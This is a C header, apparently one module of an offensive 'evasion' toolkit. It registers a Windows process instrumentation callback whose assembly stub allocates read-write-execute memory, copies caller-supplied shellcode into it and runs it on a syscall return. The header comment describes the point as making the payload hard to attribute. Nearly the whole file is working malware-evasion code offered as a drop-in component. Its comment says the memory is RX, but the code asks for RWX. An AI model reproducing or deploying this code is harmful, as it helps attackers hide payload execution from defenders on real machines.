// chunk: evasion/instrumentation_callback
// depends: (none)
// provides: instrumentation_cb_init
// headers: windows.h
// risk: medium
// note: NtSetInformationProcess with ProcessInstrumentationCallback — registers a
//       callback that fires on every transition from kernel to user mode (syscall
//       returns, interrupts, APCs). The callback address is stored in the KPROCESS
//       structure. Payload executes in the context of ANY syscall return, making it
//       extremely hard to attribute to a specific call. Single-fire design: the
//       callback copies code to RX memory, executes it once, then clears the
//       instrumentation callback to avoid infinite recursion. Requires admin/debug
//       privilege on modern Windows. Based on research by Alon Leviev.

#ifndef CHUNK_INSTRUMENTATION_CALLBACK
#define CHUNK_INSTRUMENTATION_CALLBACK

#include <windows.h>

#define ProcessInstrumentationCallback 40

/* PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION for x64 */
typedef struct _PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION {
    ULONG  Version;    /* 0 for x64 */
    ULONG  Reserved;
    PVOID  Callback;
} PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION;

typedef NTSTATUS (NTAPI *pfnNtSetInformationProcess)(
    HANDLE, ULONG, PVOID, ULONG);

typedef LPVOID (WINAPI *pfnVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);

/* Shared state for the instrumentation callback */
static volatile LONG _ic_fired = 0;
static BYTE  *_ic_payload = NULL;
static DWORD  _ic_payload_size = 0;
static pfnNtSetInformationProcess _pNtSetInfoProc = NULL;
static pfnVirtualAlloc _pVirtualAlloc = NULL;

/*
 * The instrumentation callback stub.
 *
 * On x64, when the callback fires:
 *   R10 = return address (original RIP to resume)
 *   RSP = user stack
 *   RAX = syscall return value
 *
 * We must preserve R10 (return addr) and RAX (syscall result).
 * After our work, we jump back to R10 to resume normal execution.
 *
 * To avoid infinite recursion (the callback fires on EVERY syscall return,
 * including ones we make), we use an interlocked flag. The very first thing
 * we do is check+set the flag; if already set, we immediately return.
 */
__attribute__((naked))
static void _ic_stub(void) {
    __asm__ volatile (
        /* Save everything */
        "push %%rax\n\t"
        "push %%rcx\n\t"
        "push %%rdx\n\t"
        "push %%r8\n\t"
        "push %%r9\n\t"
        "push %%r10\n\t"
        "push %%r11\n\t"
        "pushfq\n\t"
        "sub $0x28, %%rsp\n\t"          /* shadow space */

        /* Check if we already fired */
        "lea %[fired], %%rcx\n\t"
        "mov $1, %%edx\n\t"
        "xor %%eax, %%eax\n\t"
        "lock cmpxchg %%edx, (%%rcx)\n\t"
        "jne .Lic_skip\n\t"              /* already fired, skip */

        /* First time: clear the instrumentation callback to stop further calls */
        "lea %[ntsetinfo], %%rax\n\t"
        "mov (%%rax), %%rax\n\t"
        "test %%rax, %%rax\n\t"
        "jz .Lic_exec\n\t"

        /* NtSetInformationProcess(GetCurrentProcess(), PIC, &info, sizeof(info)) */
        "sub $0x20, %%rsp\n\t"           /* more stack for info struct */
        "movl $0, (%%rsp)\n\t"           /* Version = 0 */
        "movl $0, 4(%%rsp)\n\t"          /* Reserved = 0 */
        "movq $0, 8(%%rsp)\n\t"          /* Callback = NULL (disable) */
        "mov $0xFFFFFFFFFFFFFFFF, %%rcx\n\t"  /* current process */
        "mov $40, %%edx\n\t"             /* ProcessInstrumentationCallback */
        "lea (%%rsp), %%r8\n\t"          /* info struct */
        "mov $16, %%r9d\n\t"             /* sizeof */
        "call *%%rax\n\t"
        "add $0x20, %%rsp\n\t"

        ".Lic_exec:\n\t"
        /* Allocate RWX mem, copy payload, execute */
        "lea %[payload], %%rax\n\t"
        "mov (%%rax), %%rsi\n\t"         /* payload ptr */
        "test %%rsi, %%rsi\n\t"
        "jz .Lic_skip\n\t"

        "lea %[psize], %%rax\n\t"
        "mov (%%rax), %%edi\n\t"         /* payload size */
        "test %%edi, %%edi\n\t"
        "jz .Lic_skip\n\t"

        /* VirtualAlloc(NULL, size, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE) */
        "xor %%ecx, %%ecx\n\t"
        "mov %%edi, %%edx\n\t"
        "mov $0x3000, %%r8d\n\t"
        "mov $0x40, %%r9d\n\t"
        "sub $0x20, %%rsp\n\t"
        "lea %[valloc], %%rax\n\t"
        "mov (%%rax), %%rax\n\t"
        "call *%%rax\n\t"
        "add $0x20, %%rsp\n\t"
        "test %%rax, %%rax\n\t"
        "jz .Lic_skip\n\t"

        /* memcpy manually (avoid calling C runtime inside callback) */
        "mov %%rax, %%rdi\n\t"           /* dest */
        "lea %[payload], %%rcx\n\t"
        "mov (%%rcx), %%rsi\n\t"         /* src */
        "lea %[psize], %%rcx\n\t"
        "mov (%%rcx), %%ecx\n\t"         /* count */
        "push %%rax\n\t"                 /* save exec_mem */
        "rep movsb\n\t"
        "pop %%rax\n\t"

        /* Call the payload */
        "sub $0x28, %%rsp\n\t"
        "call *%%rax\n\t"
        "add $0x28, %%rsp\n\t"

        ".Lic_skip:\n\t"
        "add $0x28, %%rsp\n\t"           /* undo shadow space */
        "popfq\n\t"
        "pop %%r11\n\t"
        "pop %%r10\n\t"
        "pop %%r9\n\t"
        "pop %%r8\n\t"
        "pop %%rdx\n\t"
        "pop %%rcx\n\t"
        "pop %%rax\n\t"
        "jmp *%%r10\n\t"                 /* return to original execution */

        :
        : [fired] "m" (_ic_fired),
          [ntsetinfo] "m" (_pNtSetInfoProc),
          [payload] "m" (_ic_payload),
          [psize] "m" (_ic_payload_size),
          [valloc] "m" (_pVirtualAlloc)
        : "memory"
    );
}

/*
 * instrumentation_cb_init: Register instrumentation callback to execute payload.
 *
 * payload:      shellcode / position-independent code
 * payload_size: size in bytes
 *
 * The callback fires on the next syscall return. The payload is executed once,
 * then the callback is deregistered.
 *
 * Returns 1 on success, 0 on failure.
 * NOTE: Requires SeDebugPrivilege or admin on Windows 10+.
 */
static int instrumentation_cb_init(BYTE *payload, DWORD payload_size) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0;

    _pNtSetInfoProc = (pfnNtSetInformationProcess)GetProcAddress(
        ntdll, "NtSetInformationProcess");
    if (!_pNtSetInfoProc) return 0;

    _ic_payload = payload;
    _ic_payload_size = payload_size;
    _ic_fired = 0;
    _pVirtualAlloc = (pfnVirtualAlloc)VirtualAlloc;

    PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION info;
    info.Version = 0;   /* 0 for x64, 1 for WoW64 */
    info.Reserved = 0;
    info.Callback = (PVOID)_ic_stub;

    NTSTATUS status = _pNtSetInfoProc(
        GetCurrentProcess(),
        ProcessInstrumentationCallback,
        &info,
        sizeof(info));

    if (status != 0) return 0;

    /* Trigger a syscall to fire the callback */
    Sleep(0);

    /* Wait briefly for the callback to complete */
    for (int i = 0; i < 100 && _ic_fired == 0; i++)
        SwitchToThread();

    return (_ic_fired == 1) ? 1 : 0;
}

#endif
